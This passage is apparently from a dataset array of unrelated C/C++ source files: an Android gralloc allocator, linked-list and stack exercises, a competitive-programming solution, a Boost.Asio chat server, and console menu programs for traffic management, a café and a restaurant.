descriptor.GetProducerUsage(), descriptor.GetConsumerUsage());\n}\n\nAllocator::Allocator() : ion_allocator_(NULL) {\n}\n\nbool Allocator::Init() {\n  ion_allocator_ = new IonAlloc();\n  if (!ion_allocator_->Init()) {\n    return false;\n  }\n\n  return true;\n}\n\nAllocator::~Allocator() {\n  if (ion_allocator_) {\n    delete ion_allocator_;\n  }\n}\n\nint Allocator::AllocateMem(AllocData *alloc_data, gralloc1_producer_usage_t prod_usage,\n                           gralloc1_consumer_usage_t cons_usage) {\n  int ret;\n  alloc_data->uncached = UseUncached(prod_usage, cons_usage);\n\n  // After this point we should have the right heap set, there is no fallback\n  GetIonHeapInfo(prod_usage, cons_usage, &alloc_data->heap_id, &alloc_data->alloc_type,\n                 &alloc_data->flags);\n\n  ret = ion_allocator_->AllocBuffer(alloc_data);\n  if (ret >= 0) {\n    alloc_data->alloc_type |= private_handle_t::PRIV_FLAGS_USES_ION;\n  } else {\n    ALOGE(\"%s: Failed to allocate buffer - heap: 0x%x flags: 0x%x\", __FUNCTION__,\n          alloc_data->heap_id, alloc_data->flags);\n  }\n\n  return ret;\n}\n\nint Allocator::MapBuffer(void **base, unsigned int size, unsigned int offset, int fd) {\n  if (ion_allocator_) {\n    return ion_allocator_->MapBuffer(base, size, offset, fd);\n  }\n\n  return -EINVAL;\n}\n\nint Allocator::ImportBuffer(int fd) {\n  if (ion_allocator_) {\n    return ion_allocator_->ImportBuffer(fd);\n  }\n  return -EINVAL;\n}\n\nint Allocator::FreeBuffer(void *base, unsigned int size, unsigned int offset, int fd,\n                          int handle) {\n  if (ion_allocator_) {\n    return ion_allocator_->FreeBuffer(base, size, offset, fd, handle);\n  }\n\n  return -EINVAL;\n}\n\nint Allocator::CleanBuffer(void *base, unsigned int size, unsigned int offset, int handle, int op,\n                           int fd) {\n  if (ion_allocator_) {\n    return ion_allocator_->CleanBuffer(base, size, offset, handle, op, fd);\n  }\n\n  return -EINVAL;\n}\n\nbool Allocator::CheckForBufferSharing(uint32_t num_descriptors,\n                   ",
    "#include<stdio.h>\r\n#include<string.h>\r\n#include<stdlib.h>\r\n//\u5934\u63d2\u6cd5\u548c\u5c3e\u63d2\u6cd5,\u6309\u503c\u67e5\u627e\uff0c\u6309\u5e8f\u53f7\u67e5\u627e\uff0c\u4e00\u822c\u63d2\u5165,\u5220\u9664\u7ed3\u70b9\r\ntypedef struct LNode{//\u5355\u94fe\u8868\u7ed3\u70b9\u7c7b\u578b\r\n\tint data;//\u6570\u636e\u57df\r\n\tstruct LNode* next;//\u6307\u9488\u57df\r\n}LNode, * LinkList;//\u5b9a\u4e49\u6307\u5411\u5355\u94fe\u8868\u7684\u5934\u6307\u9488\r\n\r\nLinkList ListHeadInsert(LinkList& L)\r\n{\r\n\tLNode* s;//next\u57df\u6307\u9488\r\n\tint x;\r\n\tL = (LinkList)malloc(sizeof(LNode));//\u521b\u5efa\u5934\u7ed3\u70b9L\r\n\tL->next = NULL;//\u5934\u7ed3\u70b9\u6307\u5411\u7a7a\u94fe\u8868\r\n\t\r\n\twhile (scanf(\"%d\",&x)!= 9999)//\u8f93\u51659999\u8868\u793a\u7ed3\u675f\r\n\t{\r\n\t\ts = (LNode*)malloc(sizeof(LNode));//\u521b\u5efa\u65b0\u8282\u70b9s\r\n\t\ts->data = x;\r\n\t\ts->next = L->next;//\u5934\u63d2\u6cd5\r\n\t\tL->next = s;\r\n\t\tscanf(\"%d\\n\", &x);\r\n\t}\r\n\treturn L;\r\n}\r\nLinkList ListRearInsert(LinkList& L)//\u5c3e\u63d2\u6cd5\r\n{\r\n\tint x;\r\n\tL = (LinkList)malloc(sizeof(LNode));//\u5efa\u7acb\u5934\u7ed3\u70b9\r\n\tLNode *s2, *r = L;\r\n\twhile (scanf(\"%d\", &x) != 9999)\r\n\t{\r\n\t\ts2 = (LinkList)malloc(sizeof(LNode));\r\n\t\ts2->data = x;\r\n\t\tr->next = s2;\r\n\t\tr = s2;\r\n\r\n\t}\r\n\tr->next = NULL;\r\n\treturn L;\r\n}\r\nLNode* FindX(LinkList& L, int val)//\u6309\u503c\u67e5\u627e\r\n{\r\n\tLNode *p = L->next;//\u8bbe\u5f53\u524d\u7ed3\u70b9\u7b2c\u4e00\u4e2a\u7ed3\u70b9\u4e3ap\r\n\twhile (p->data != val&&p!=NULL)\r\n\t{\r\n\t\tp = p->next;\r\n\t}\r\n\treturn p;\r\n}\r\nLNode* FindLNodei(LinkList& L, int i)//\u6309\u4f4d\u67e5\u627e\r\n{\r\n\tint j = 1;\r\n\tLNode* p = L->next;\r\n\tif (i == 0)\r\n\t\treturn L;\r\n\tif (i < 1)\r\n\t\treturn NULL;\r\n\twhile (p != NULL && j < i)\r\n\t{\r\n\t\tp = p->next;\r\n\t\tj++;\r\n\t}\r\n\treturn p;//\u8fd4\u56de\u7b2ci\u4e2a\u7ed3\u70b9\u7684\u6307\u9488\r\n}\r\nLinkList CommonInsert(LinkList& L,int i)//\u666e\u901a\u63d2\u5165\u7b2ci\u4e2a\u4f4d\u7f6e,\u975e\u5c3e\u63d2\u6cd5\r\n{\r\n\tint x;//\u5f85\u63d2\u5165\u5143\u7d20\u503c\r\n\tif (i < 1)//\u8f93\u5165\u4f4d\u7f6e\u9519\u8bef\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\t\tLNode* p = FindLNodei(L, i - 1);//\u627e\u4f4d\u7f6e\u7b2ci-1\r\n\t\tLNode* s = (LinkList)malloc(sizeof(LNode));//\u521b\u5efa\u5f85\u63d2\u5165\u7ed3\u70b9s\r\n\t\tscanf(\"%x\", &x);//\u8f93\u5165\u5f85\u63d2\u5165\u7ed3\u70b9\u503c\r\n\t\ts->data = x;\r\n\t\ts->next = p->next;\r\n\t\tp->next = s;\r\n\t\treturn L;\r\n\t\t\r\n\t\r\n\tif (i == 1)\r\n\t{\r\n\t\tListHeadInsert(L);//\u5934\u63d2\u6cd5\u63d2\u5230\u7b2c\u4e00\u4e2a\u4f4d\u7f6e\r\n\t}\r\n}\r\nLinkList DeleteLNode(LinkList& L, int i)//\u5220\u9664\u7b2ci\u4e2a\u7ed3\u70b9\r\n{\r\n\tif (i < 1)//\u8f93\u5165\u4f4d\u7f6e\u9519\u8bef\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\tLNode* p = FindLNodei(L, i-1);//\u5b9a\u4f4d\u5f85\u5220\u9664\u7ed3\u70b9\r\n\tLNode* q = p->next;\r\n\tp->next = q->next;\r\n\tfree(q);//\u56de\u6536\u7ed3\u70b9\u6307\u9488\r\n\treturn L;\r\n}\r\n",
    "/*\n *       Author :   Mehedi Hasan \n *       Created:   Fri 03.Jan.2025 06:59:41\n *       File   :   A_Kevin_and_Combination_Lock.cpp\n*/\n\n#include <bits/stdc++.h>\nusing namespace std;\n\n#define ll long long\n#define ld long double\n#define ar array\n#define pb push_back\n#define lb lower_bound\n#define ub upper_bound\n#define eb emplace_back\n\n#include <ext/pb_ds/assoc_container.hpp>\n#include <ext/pb_ds/tree_policy.hpp>\nusing namespace __gnu_pbds;\n\ntemplate <typename T> using order_set = tree<T, null_type, less<T>, rb_tree_tag, tree_order_statistics_node_update>;\n\n#define vt vector\n#define sz(x) (int)(x).size()\n#define all(x) (x).begin(), (x).end()\n#define rall(x) (x).rbegin(), (x).rend()\n#define summ(a) (accumulate(all(a), 0LL))\n#define PI 2 * acos(0)\n#define torad(x) (x) * ((2 * acos(0)) / 180.0)\n#define eps 1e-15\n#define pii pair<int, int>\n#define pll pair<ll, ll>\n#define PQ priority_queue\n#define ff first\n#define ss second\n#define inf 0x3f3f3f3f\n\n#define F_OR(i, a, b, s) for (int i=(a); (s)>0?i<(b):i>(b); i+=(s))\n#define F_OR1(e) F_OR(i, 0, e, 1)\n#define F_OR2(i, e) F_OR(i, 0, e, 1)\n#define F_OR3(i, b, e) F_OR(i, b, e, 1)\n#define F_OR4(i, b, e, s) F_OR(i, b, e, s)\n#define GET5(a, b, c, d, e, ...) e\n#define F_ORC(...) GET5(__VA_ARGS__, F_OR4, F_OR3, F_OR2, F_OR1)\n#define FOR(...) F_ORC(__VA_ARGS__)(__VA_ARGS__)\n#define EACH(x, a) for (auto& x: a)\n\ntemplate<class T> bool umin(T& a, const T& b) {\n    return b<a?a=b, 1:0;\n}\ntemplate<class T> bool umax(T& a, const T& b) { \n    return a<b?a=b, 1:0;\n} \n\nll FIRSTTRUE(function<bool(ll)> f, ll lb, ll rb) {\n    while(lb<rb) {\n        ll mb=(lb+rb)>>1;\n        f(mb)?rb=mb:lb=mb+1; \n    } \n    return lb;\n}\nll LASTTRUE(function<bool(ll)> f, ll lb, ll rb) {\n    while(lb<rb) {\n        ll mb=(lb+rb+1)>>1;\n        f(mb)?lb=mb:rb=mb-1; \n    } \n    return lb;\n}\n\ntemplate<class A> void read(vt<A>& v);\ntemplate<class A, size_t S> void read(ar<A, S>& a);\ntemplate<class T> void read(T& x) {\n    cin >> x;\n}\nvoid read(double& d) {\n    string t;\n    read(t);\n    d=stod(t);\n}\nvoid read(long double& d) {\n    string t;\n    read(t);\n    d=stold(t);\n}\ntemplate<class H, class... T> void read(H& h, T&... t) {\n    read(h);\n    read(t...);\n}\ntemplate<class A> void read(vt<A>& x) {\n    EACH(a, x)\n        read(a);\n}\ntemplate<class A, size_t S> void read(array<A, S>& x) {\n    EACH(a, x)\n        read(a);\n}\n\nstring to_string(char c) {\n    return string(1, c);\n}\nstring to_string(bool b) {\n    return b?\"true\":\"false\";\n}\nstring to_string(const char* s) {\n    return string(s);\n}\nstring to_string(string s) {\n    return s;\n}\nstring to_string(vt<bool> v) {\n    string res;\n    FOR(sz(v))\n        res+=char('0'+v[i]);\n    return res;\n}\n\ntemplate<size_t S> string to_string(bitset<S> b) {\n    string res;\n    FOR(S)\n        res+=char('0'+b[i]);\n    return res;\n}\ntemplate<class T> string to_string(T v) {\n    bool f=1;\n    string res;\n    EACH(x, v) {\n        if(!f)\n            res+=' ';\n        f=0;\n        res+=to_string(x);\n    }\n    return res;\n}\n\ntemplate<class A> void write(A x) {\n    cout << to_string(x);\n}\ntemplate<class H, class... T> void write(const H& h, const T&... t) { \n    write(h);\n    write(t...);\n}\nvoid print() {\n    write(\"\\n\");\n}\ntemplate<class H, class... T> void print(const H& h, const T&... t) { \n    write(h);\n    if(sizeof...(t))\n        write(' ');\n    print(t...);\n}\n\nvoid DBG() {\n    cerr << \"]\" << endl;\n}\ntemplate<class H, class... T> void DBG(H h, T... t) {\n    cerr << to_string(h);\n    if(sizeof...(t))\n        cerr << \", \";\n    DBG(t...);\n}\n\n#define _DEBUG\n#ifdef _DEBUG\n#define dbg(...) cerr << \"LINE(\" << __LINE__ << \") -> [\" << #__VA_ARGS__ << \"]: [\", DBG(__VA_ARGS__)\n#else\n#define dbg(...) 0\n#endif\n\ntemplate<class T> void offset(ll o, T& x) {\n    x+=o;\n}\ntemplate<class T> void offset(ll o, vt<T>& x) {\n    EACH(a, x)\n        offset(o, a);\n}\ntemplate<class T, size_t S> void offset(ll o, ar<T, S>& x) {\n    EACH(a, x)\n        offset(o, a);\n}\n\nmt19937 mt_rng(chrono::steady_clock::now().time_since_epoch().count());\nll randint(ll a, ll b) {\n    return uniform_int_distribution<ll>(a, b)(mt_rng);\n}\n\ntemplate<class T, class U> void vti(vt<T> &v, U x, size_t n) {\n    v=vt<T>(n, x);\n}\ntemplate<class T, class U> void vti(vt<T> &v, U x, size_t n, size_t m...) {\n    v=vt<T>(n);\n    EACH(a, v)\n        vti(a, x, m);\n}\n\nconst int d4i[4]={-1, 0, 1, 0}, d4j[4]={0, 1, 0, -1};\nconst int d8i[8]={-1, -1, 0, 1, 1, 1, 0, -1}, d8j[8]={0, 1, 1, 1, 0, -1, -1, -1};\nconst int mod = 1e9 + 7;\nconst ll INF = 1e14;\nconst int mxN = 1e6 + 10;\nconst int N = 1e3 + 10;\nint n,m;\n\nvoid solve() \n{\n    int x;\n    read(x);\n    print(x%33==0?\"YES\":\"NO\");\n}\n\nint main() {\n    ios::sync_with_stdio(0);\n    cin.tie(0);\n\n    int t=1;\n    read(t);\n    FOR(t) {\n        //write(\"Case #\", i+1, \": \");\n        solve();\n    }\n}",
    "#include <boost/asio.hpp>\n#include <boost/algorithm/string.hpp>\n#include <iostream>\n#include <string>\n#include <thread>\n#include <vector>\n#include <mutex>\n#include <ctime>\n#include <unordered_map>\n#include <fstream>\n#include <sstream>\n#include <regex>\n#include <random>\n#include <nlohmann/json.hpp>\n#include <set>\n#include <map>\n#include <memory>\n#include <filesystem>\n#include <boost/beast/core.hpp>\n#include <boost/asio/strand.hpp>\n\nusing boost::asio::ip::tcp;\n\nstd::vector<std::shared_ptr<tcp::socket>> clients;\nstd::mutex clients_mutex;\nstd::unordered_map<std::shared_ptr<tcp::socket>, std::string> client_sessions;\nstd::vector<std::string> message_history;\n\nstd::set<std::string> active_connections;\nstd::map<std::string, std::shared_ptr<tcp::socket>> active_users;\n\nstd::ofstream log_file(\"server_log.txt\", std::ios::out | std::ios::app);\n\nvoid log_to_console_and_file(const std::string& message) {\n    std::cout << message << std::endl;\n    if (log_file.is_open()) {\n        log_file << message << std::endl;\n    }\n}\n\nstd::string get_current_time() {\n    std::time_t now = std::time(nullptr);\n    char buffer[100];\n    std::strftime(buffer, sizeof(buffer), \"%Y-%m-%d %H:%M:%S\", std::localtime(&now));\n    return std::string(buffer);\n}\n\nstd::string generate_session_id() {\n    std::random_device rd;\n    std::mt19937 gen(rd());\n    std::uniform_int_distribution<> dis(100000, 999999);\n    return \"Session-\" + std::to_string(dis(gen));\n}\n\nstd::string process_command(const std::string& command, const std::string& session_id) {\n    if (command == \"/time\") {\n        return \"Server time: \" + get_current_time();\n    } else if (command == \"/clients\") {\n        return \"Connected clients: \" + std::to_string(clients.size());\n    } else if (command == \"/session\") {\n        return \"Your session ID: \" + session_id;\n    } else if (command == \"/quote\") {\n        static const std::vector<std::string> quotes = {\n            \"The only limit to our realization of tomorrow is our doubts of today.\",\n            \"Do not wait to strike till the iron is hot; but make it hot by striking.\",\n            \"Great minds discuss ideas; average minds discuss events; small minds discuss people.\",\n            \"Success usually comes to those who are too busy to be looking for it.\"\n        };\n        std::random_device rd;\n        std::mt19937 gen(rd());\n        std::uniform_int_distribution<> dis(0, quotes.size() - 1);\n        return \"Quote of the day: \" + quotes[dis(gen)];\n    } else if (command == \"/messages\") {\n        std::string message_history_str = \"<ul>\";\n        for (const auto& message : message_history) {\n            message_history_str += \"<li>\" + message + \"</li>\";\n        }\n        message_history_str += \"</ul>\";\n        return message_history_str;\n    } else {\n        return \"Unknown command: \" + command;\n    }\n}\n\nvoid broadcast_message(const std::string& message, std::shared_ptr<tcp::socket> sender_socket) {\n    {\n        message_history.push_back(message);\n        if (message_history.size() > 50) {\n            message_history.erase(message_history.begin());\n        }\n\n        log_to_console_and_file(\"[\" + get_current_time() + \"] Current message history:\");\n        for (const auto& msg : message_history) {\n            log_to_console_and_file(msg);\n        }\n\n        for (auto& client : clients) {\n            if (client != sender_socket) {\n                boost::system::error_code error;\n                boost::asio::write(*client, boost::asio::buffer(message), error);\n                if (error) {\n                    log_to_console_and_file(\"[\" + get_current_time() + \"] Error sending message: \" + error.message());\n                }\n            }\n        }\n    }\n\n    log_to_console_and_file(\"[\" + get_current_time() + \"] Broadcasted message: \" + message);\n}\n\nstd::string generate_html_page(const std::string& session_id) {\n    std::string html_path = \"./html/index.html\";\n\n    if (!std::filesystem::exists(html_path)) {\n        log_to_console_and_file(\"[\" + get_current_time() + \"] Error: HTML template file not found at \" + html_path);\n        return \"Error: HTML template file not found.\";\n    }\n\n    std::ifstream file(html_path);\n\n    std::stringstream buffer;\n    buffer << file.rdbuf();\n    std::string html_content = buffer.str();\n\n    std::string current_time = get_current_time();\n    static const std::string quote_of_the_day = \"The only limit to our realization of tomorrow is our doubts of today.\";\n\n    std::vector<std::shared_ptr<tcp::socket>> local_clients;\n    std::vector<std::string> local_message_history;\n    {\n        local_clients = clients;\n        local_message_history = message_history;\n    }\n\n    std::string connected_clients;\n    for (auto& client : clients) {\n        try {\n            if (client && client->is_open()) {\n                connected_clients += \"<li>\" + client->remote_endpoint().address().to_string() + \"</li>\";\n            }\n        } catch (const std::exception& e) {\n            log_to_console_and_file(\"[\" + get_current_time",
    "#include <iostream>\r\n#include <windows.h>\r\n#include<cstring>\r\n#include<fstream>\r\n#include<cstdlib>\r\nusing namespace std;\r\nstruct traffic\r\n{string owner_name;//the name of the owner of the car\r\nstring vehicle_model;//the name of the vechile\r\nstring date;//date and time \r\nstring distruction ;\r\nstring location;//may be where was occur\r\nstring owner_address;\r\nstruct rule\r\n{string owner;\r\ndouble fee;//the fees\r\nstring reasons;//what was the problem\r\n}penality;\r\nstruct closed_roads\r\n{\r\nstring reason;\r\nstring ro_location;\r\nstring length_of_duration;\r\nstring road_name;\r\nstring date_start;\r\n}road;\r\nstruct add_vehicles\r\n{\r\nstring proprietor_name;\r\nstring license_number;\r\nstring vehicle_type;\r\nstring insurance_info;\r\nstring registration_number;\r\nstring contact_info;\r\n}add;\r\n}Trafic_data;\r\nvoid up_del_add_vehicles();//function to update and delete the vehicles information.\r\nvoid up_del_accident_info();// Function to update and delete accident information.\r\nvoid traffic_vio_penalty();// Function to add and view traffic violation penalties.\r\nvoid showaccident_info();// Function to display previously occurred accidents.\r\nvoid show_closed_roads();// Function to show information about closed roads.\r\nvoid display_vehicles();// Function to show the list of added vehicles.\r\nvoid accident_info();// Function to input details about accidents.\r\nvoid add_vehicles();// Function to add a new vehicle for a specific road stream.\r\nvoid closed_roads();// Function to manage closed road information.\r\nvoid traffic();// Function to provide information about traffic.\r\nint main_menu();// Function to display the main menu options.\r\nint main()\r\n{ \r\nsystem(\"cls\");\r\nsystem(\"color 2\");\r\ncout<<\"\\t*************************************************************\\n\\n\";\r\ncout<<\"\\t________  WELLCOME TO TRAFFIC MANAGEMENT PROGRAM  _________\\n\\n\";\r\ncout<<\"\\t\\t\\t*********************************\\n\\n\\n\";\r\ncout<<\"enter any key to go next\\n\";\r\ncin.get();\r\nsystem(\"cls\");\r\nint d;\r\ndo\r\n{ \r\nd=main_menu();\r\nswitch (d)\r\n{case 0:\r\nup_del_add_vehicles();\r\nbreak;\r\ncase 1:\r\nclosed_roads() ;\r\nbreak;\r\ncase 2:\r\naccident_info();\r\nbreak;\r\ncase 3:\r\nup_del_accident_info();\r\nbreak;\r\ncase 4:\r\ntraffic_vio_penalty();\r\nbreak;\r\ncase 5:\r\nshow_closed_roads();\r\nbreak;\r\ncase 6:\r\ndisplay_vehicles();\r\nbreak;\r\ncase 7:\r\nshowaccident_info();\r\nbreak;\r\ncase 8:\r\nadd_vehicles();\r\nbreak;\r\ncase 9:\r\ntraffic();\r\nbreak;\r\ncase 10:\r\ncout<<\"EXITTING ...........................\\n\\n\\n\\n\\n\";\r\nbreak;\r\ndefault:\r\ncout<<\"wrong input please enter again\\n\";\r\ncout<<\"press enter to go menu\\n\\n\";\r\ncin.get();\r\nbreak;\r\n}\r\n}while(d!=10);\r\n\r\nreturn 0; \r\n}\r\nint  main_menu()\r\n{ int x;\r\nsystem(\"cls\");\r\ncout<<\"\\t0,for put update and delete the information about vehicles\\n\";\r\ncout<<\"\\t---------------------------------------------------------------\\n\";\r\ncout<<\"\\t1,for put information about the road that will be closed\\n\";\r\ncout<<\"\\t---------------------------------------------------------------\\n\";\r\ncout<<\"\\t2, for record information regarding  accidents\\n\";\r\ncout<<\"\\t----------------------------------------------------------------\\n\";\r\ncout<<\"\\t3,for update or delete the information about add accidents \\n\";\r\ncout<<\"\\t-----------------------------------------------------------------\\n\";\r\ncout<<\"\\t4,for add and see punishments for violation of the law of traffic\\n\";\r\ncout<<\"\\t------------------------------------------------------------------\\n\";\r\ncout<<\"\\t5,for show the closed roads\\n\";\r\ncout<<\"\\t--------------------------------------------\\n\";\r\ncout<<\"\\t6,for display vechiles list and information\\n\";\r\ncout<<\"\\t---------------------------------------------\\n\";\r\ncout<<\"\\t7,for show the accidents\\n\";\r\ncout<<\"\\t-----------------------------------\\n\";\r\ncout<<\"\\t8, for add new vechiles\\n\";\r\ncout<<\"\\t---------------------------------\\n\";\r\ncout<<\"\\t9,for traffic flows\\n\";\r\ncout<<\"\\t--------------------------------\\n\";\r\ncout<<\"\\t10,for exit\\n\\n\";\r\ncout<<\"__________________________________________________________________________\\n\";\r\ncout<<\"enter your choice!\\n\\n\";\r\ncin>>x;\r\ncin.ignore();\r\nreturn x;\r\n}\r\n///////////////////////////////////////////////////\r\n//////////////////////////////////////////////////\r\nvoid traffic(){\r\n  system(\"cls\");\r\nfor(int i=0;i<6;i++){\r\nsystem(\"cls\");\r\ncout << \"\\n\\n\\t_____________________________________________\" << endl<<endl;\r\ncout<<\"\\t\\tSTOP! UNTILL THE TIMING IS FINISHED\"<<\"            :\"<<i<<\"\\n\";\r\ncout << \"\\t_________________________________________________\" << endl<<endl;\r\nsystem(\"color 0C\");//about stop which is red\r\nSleep(1000);\r\n}\r\nfor(int i=0;i<6;i++)\r\n{\r\nsystem(\"cls\");\r\ncout << \"\\n\\n\\t_____________________________________________\" << endl<<endl;\r\ncout<<\"\\t\\tGO! UNTILL THE TIMING IS FINISHED\"<<\"            :\"<<i<<\"\\n\";\r\ncout << \"\\t_________________________________________________\" << endl<<endl;\r\nsystem(\"color 0A\");//about go green\r\nSleep(1000);}\r\nfor(int i=0;i<6;i++){\r\nsystem(\"cls\");\r\ncout << \"\\n\\n\\t_____________________________________________\" << endl<<endl;\r\ncout<<\"\\t\\tPREPARE TO STOP! UNTILL THE",
    "/*\nA constructor in C++ is a special method that is automatically called when an object of a class is created.\n\nTo create a constructor, use the same name as the class, followed by parentheses ().\n\n// example...\n\nclass MyClass {     // The class\n  public:           // Access specifier\n    MyClass() {     // Constructor\n      cout << \"Hello World!\";\n    }\n};\n\nint main() {\n  MyClass myObj;    // Create an object of MyClass (this will call the constructor)\n  return 0;\n}\n\nNote: The constructor has the same name as the class, it is always public, and it does not have any return value.\n\n\n*/\n\n#include <iostream>\n\nusing namespace std;\nclass Car {        // The class\n  public:          // Access specifier\n    string brand;  // Attribute\n    string model;  // Attribute\n    int year;      // Attribute\n    Car(string x, string y, int z); // Constructor declaration\n};\n\n// Constructor definition outside the class\nCar::Car(string x, string y, int z) {\n  brand = x;\n  model = y;\n  year = z;\n}\n\nint main() {\n  // Create Car objects and call the constructor with different values\n  Car carObj1(\"BMW\", \"X5\", 1999);\n  Car carObj2(\"Ford\", \"Mustang\", 1969);\n\n  // Print values\n  cout << carObj1.brand << \" \" << carObj1.model << \" \" << carObj1.year << \"\\n\";\n  cout << carObj2.brand << \" \" << carObj2.model << \" \" << carObj2.year << \"\\n\";\n  return 0;\n}\n",
    "#include <iostream>\n#include <string>\n#include <limits>\n\nusing namespace std;\n\nvoid clearConsole()\n{\n    system(\"cls\");\n}\nvoid menu()\n{\ncout << \"1. Tea (7.5 EGP)\\n\";\ncout << \"2. Coffee (15 EGP)\\n\";\ncout << \"3. Nescafe (20 EGP)\\n\";\ncout << \"4. Sahlab (20 EGP)\\n\";\ncout << \"5. Sahlab nuts (27 EGP)\\n\";\ncout << \"6. Anise (15 EGP)\\n\";\ncout << \"7. Mango Drink (30 EGP)\\n\";\ncout << \"8. Grape Drink (20 EGP)\\n\";\ncout << \"9. Tea and Milk (15 EGP)\\n\";\ncout << \"10. Pepsi - Cola  Drink (15 EGP)\\n\";\ncout << \"11. Shesha Fruits (20 EGP)\\n\";\ncout << \"12. Shesha (10 EGP)\\n\";\ncout << \"0. Done placing orders\\n\";\ncout << \"Enter product number to add to order (0 to finish): \";\n}\nvoid waitForEnter()\n{\n    cout << \"\\n\\nPress Enter to continue...\\n\";\n    cout.flush();\n    cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n    cin.get();\n    clearConsole();\n}\n\nclass Node\n{\npublic:\n    string order;\n    float price;\n    Node* next;\n\n    Node(string order, float price)\n    {\n        this->order=order;\n        this->price=price;\n        this->next=nullptr;\n    }\n};\n\nclass Stack\n{\nprivate:\n    Node* top;\n\n\npublic:\n    float totalPrice;\n    Stack()\n    {\n        this->totalPrice=0;\n        this->top=nullptr;\n    }\n\n    void push(string order, float price)\n    {\n        clearConsole();\n        Node* newNode = new Node(order, price);\n        newNode->next = top;\n        top = newNode;\n        totalPrice += price;\n        cout << \"Order placed successfully: \" << order << \" (Price: \" << price << \" EGP)\\n\";\n    }\n\n    void popLast()\n    {\n        string choice;\n        if (isEmpty())\n        {\n            cout << \"No orders to process.\\n\";\n            waitForEnter();\n            return;\n        }\n\n        cout << \"Are you sure you want to delete the last order ? (last order is : \" << top->order << \" )\\nEnter Y/y for confirming or anything else to get back: \";\n        cin >> choice;\n        if (choice == \"Y\" || choice == \"y\")\n        {\n        string order = top->order;\n        float price = top->price;\n        Node* temp = top;\n        top = top->next;\n        delete temp;\n        totalPrice -= price;\n        cout << \"Deleted last order: \" << order << \" (Price: \" << price << \" EGP)\\n\";\n            waitForEnter();\n        }\n        else\n        {\n            cout << \"nothing effect the orders\";\n            waitForEnter();\n        }\n        clearConsole();\n        return ;\n        \n        \n    }\n\n    void popAll()\n    {   string choice;\n        if (isEmpty())\n        {\n            cout << \"No orders to process.\\n\";\n            waitForEnter();\n            return;\n        }\n\n        cout << \"Are you sure you want to delete all the orders ? there is no return for this choice\\nEnter Y/y for confirming or anything else to get back: \";\n        cin >> choice;\n        if (choice == \"Y\" || choice == \"y\")\n        {\n           \n            do {\n                string order = top->order;\n                float price = top->price;\n                Node* temp = top;\n                top = top->next;\n                delete temp;\n                totalPrice -= price;\n            }\n             while (top!=nullptr);\n\n            cout << \"All the orders have been deleted successfully.\\n\";\n            waitForEnter();\n        }\n        else\n        {\n            cout << \"nothing effect the orders\";\n            waitForEnter();\n        }\n        return;\n    }\n\n    bool isEmpty()\n    {\n        return top == nullptr;\n    }\n\n    void display()\n    {\n        if (isEmpty())\n        {\n            cout << \"No orders to display.\\n\";\n            return;\n        }\n        Node* current = top;\n        cout << \"Orders in the stack:\\n\";\n        while (current != nullptr)\n        {\n            cout << current->order << \" (Price: \" << current->price << \" EGP)\\n\";\n            current = current->next;\n        }\n        cout << \"Total Price: \" << totalPrice << \" EGP\\n\";\n    }\n\n    // ~Stack()\n    // {\n    //     while (!isEmpty())\n    //     {\n    //         popLast();\n    //     }\n    // }\n};\n\nint main()\n{\n    Stack stack;\n    int choice;\n\n    do\n    {\n        cout << \"\\nCafe Cashier System Menu:                           \"\n             << \"Total price for the current order is : \" << stack.totalPrice << \" EGP\\n\";\n        cout << \"1. Place Order\\n\";\n        cout << \"2. Display Orders\\n\";\n        cout << \"3. Reset Orders\\n\";\n        cout << \"4. Delete Last Order\\n\";\n        cout << \"5. Exit\\n\";\n        cout << \"Enter your choice: \";\n\n        string input;\n        cin >> input;\n\n        try\n        {\n            choice = stoi(input);\n            switch (choice)\n            {\n            case 1:\n            {\n                clearConsole();\n                while (true)\n                {\n                    cout << endl\n                         << \"Menu:                                               Total price for the current order is : \" << stack.totalPrice << \" EGP\\n\";\n                         menu();\n\n                    string input_product;\n                    cin >> input_product;\n  ",
    "#include <iostream>\n#include \"Meniu.h\"\n#include \"Staff.h\"\n#include \"Interfata.h\"\n#include <fstream>\n#include <vector>\n#include \"Factory.h\"\n#include \"Produs.h\"\n\nusing namespace std;\n\nvoid Interfata::populeazaMeniu(Meniu *meniu) {\n    const vector<Element *> mancare = {\n        new Produs<Mancare>(\"Big Mac\", 508, 18.00, 219),\n        new Produs<Mancare>(\"McChicken\", 403, 17.00, 173),\n        new Produs<Mancare>(\"Cheeseburger\", 301, 7.00, 115),\n        new Produs<Mancare>(\"Double Cheeseburger\", 445, 12.00, 155),\n        new Produs<Mancare>(\"Chicken McNuggets (6 bucati)\", 259, 14.00, 87),\n        new Produs<Mancare>(\"Filet-o-Fish\", 327, 17.50, 142),\n        new Produs<Mancare>(\"McWrap Crispy\", 479, 19.00, 215),\n        new Produs<Mancare>(\"Cartofi prajiti\", 320, 9.50, 117),\n        new Produs<Mancare>(\"McMuffin cu Ou si Bacon\", 295, 12.00, 113),\n        new Produs<Mancare>(\"McToast\", 265, 6.50, 102)\n    };\n    for (size_t i = 0; i < mancare.size(); ++i) {\n        meniu->get_lista() = *mancare[i] + meniu->get_lista();\n    }\n    const vector<Element *> bauturi = {\n        new Produs<Bautura>(\"Coca-Cola\", 112, 7.00, 250),\n        new Produs<Bautura>(\"Fanta\", 105, 7.00, 250),\n        new Produs<Bautura>(\"Sprite\", 100, 7.00, 250),\n        new Produs<Bautura>(\"Milkshake\", 330, 12.00, 300),\n        new Produs<Bautura>(\"Cafea\", 0, 6.00, 250),\n        new Produs<Bautura>(\"Apa plata\", 0, 5.00, 500),\n        new Produs<Bautura>(\"Suc de portocale\", 150, 10.00, 400)\n    };\n    for (size_t i = 0; i < bauturi.size(); ++i) {\n        meniu->get_lista() = *bauturi[i] + meniu->get_lista();\n    }\n}\n\n\nvoid Interfata::run(Meniu *meniu, Staff &staff) {\n    populeazaMeniu(meniu);\n    bool intf = false;\n    while (!intf) {\n        cout << \"Bine ati venit!\\n\\t1. Comanda acum!\"\n                \"\\n\\t2. Vizualizare status comanda\"\n                \"\\n\\t3. Staff only!\"\n                \"\\n\\t4. Exit\\n\";\n        unsigned int optiune;\n        cout << \"Optiune: \";\n        cin >> optiune;\n        switch (optiune) {\n            case 1: {\n                auto *comanda = new Comanda();\n                bool cmd = false;\n                cout << \"Alege locul unde vei servi. (default in restaurant)\"\n                        \"\\n\\t1. In restaurant\"\n                        \"\\n\\t2. La pachet\\n\";\n                unsigned int lct;\n                cout << \"Optiune: \";\n                cin >> lct;\n                if (lct == 2) {\n                    